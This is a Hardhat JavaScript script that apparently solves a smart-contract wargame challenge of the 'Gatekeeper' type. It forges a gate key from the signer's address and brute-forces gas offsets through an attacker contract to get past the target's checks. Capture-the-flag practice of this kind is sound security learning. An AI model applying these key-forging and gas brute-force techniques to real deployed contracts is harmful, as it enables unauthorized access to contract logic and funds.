const hre = require("hardhat");

async function main() {
  const gatekeeperAttackerAddress = '0x05925732fF2d7bbfb2CAf4eF682256e2225086Ea';
  const gateAddress = '0x33fff146301f819789A5a3D1B4108f0F47fFB7d4';

  const [attacker] = await hre.ethers.getSigners();

  const GatekeeperAttacker = await ethers.getContractFactory('GatekeeperAttacker');
  const attackerContract = await GatekeeperAttacker.attach(gatekeeperAttackerAddress);

  const gas = 80000;
  let i = 0;
  const txOrigin = hre.ethers.utils.hexZeroPad(attacker.address, 32);
  const part3 = hre.ethers.utils.hexDataSlice(txOrigin, 30);
  const part1 = "0x00000001";
  const part2 = "0x0000";
  const key = hre.ethers.utils.hexConcat([part1, part2, part3]);
  await attackerContract.checkGate3(key);
  for (i = 0; i < 8191; i++) {
    try {
      console.log(gas + i)
      await attackerContract.enter(gateAddress, key, gas + i, {
        gasLimit: 120000,
      });
      // break;
    }
    catch (error) { console.log("Error: ", error) }
  }

  console.log(`Key: ${key}`);
  console.log(`Gas used: ${i}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
